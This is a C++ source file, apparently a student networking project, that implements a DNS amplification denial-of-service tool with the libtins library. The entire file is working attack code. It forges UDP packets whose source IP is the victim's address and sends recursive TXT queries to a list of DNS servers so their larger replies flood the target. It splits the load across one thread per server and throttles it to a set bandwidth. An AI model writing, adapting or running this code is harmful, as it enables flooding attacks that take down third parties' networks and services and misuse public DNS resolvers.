//
// Created by stefano on 12/01/21.
//

#include "DnsAmplification.h"
#include <thread>
#include <cmath>
#include <utility>
#include <iostream>

// 70 => size of dns query packet
// 2^20 => convert MB to bytes
DnsAmplification::DnsAmplification(const IPv4Address &dstIp, std::vector<IPv4Address> dnsServers,
                                   const unsigned int upload_size, const unsigned int threadsNumber,
                                   const unsigned int upload_bandwidth) : dst_ip(dstIp),
                                                                          dns_servers(std::move(dnsServers)),
                                                                          counter((unsigned )(upload_size*pow(2, 20)/70)),
                                                                          threads_number(threadsNumber),
                                                                          upload_bandwidth(upload_bandwidth) {}

void DnsAmplification::init_random(){
    unsigned seed = time(nullptr);
    srand(seed);
}


void DnsAmplification::dns_amplification(IPv4Address target_ip, const IPv4Address dns_server,
                                         unsigned counter, double upload_bandwidth){
    init_random();

    NetworkInterface interface = NetworkInterface::default_interface();
    NetworkInterface::Info info = interface.addresses();
    PacketSender sender;

    IP ip = IP(dns_server, target_ip) / UDP(53,rand() % 65535) / DNS();
    DNS *dns = ip.find_pdu<DNS>();
    dns->recursion_desired(1);
    dns->add_query(DNS::query("polito.it", DNS::QueryType::TXT, DNS::QueryClass::IN));

    // Mando 300 pacchetti prima di attendere di dimensione 69*8 bit con una banda di x * 10^6 bits/s
    std::chrono::duration<double> time_per_1000_packets((300*69*8 / (upload_bandwidth*pow(10,6))));
    std::cout << ip.src_addr() << " >> " << ip.dst_addr() << std::endl;

    for(int i=0; i<(int)(counter/300); i++){
        auto start = std::chrono::steady_clock::now();
        for(int j=0; j<300; j++){
            sender.send(ip, interface);
        }
        std::this_thread::sleep_until(start + time_per_1000_packets);
        auto end = std::chrono::steady_clock::now();
        std::chrono::duration<double> elapsed_seconds = end-start;
    }
}

void DnsAmplification::run() {
    NetworkInterface interface = NetworkInterface::default_interface();
    std::cout << "Interface: " << interface.name() << std::endl;
    std::cout << "Threads: " << dns_servers.size() << std::endl;

    std::vector<std::thread> threads;
    auto start = std::chrono::steady_clock::now();
    for(auto dns_server: dns_servers){
        threads.emplace_back(
                dns_amplification,
                dst_ip,
                dns_server,
                (int)(counter/dns_servers.size()),
                ((double)upload_bandwidth)/dns_servers.size()
        );
    }
    for(std::thread &t: threads){
        t.join();
    }
    auto end = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsed_seconds = end-start;
    std::cout << "elapsed time: " << elapsed_seconds.count() << std::endl;
    std::cout << "pps: " << counter/elapsed_seconds.count() << " pps" << std::endl;
}

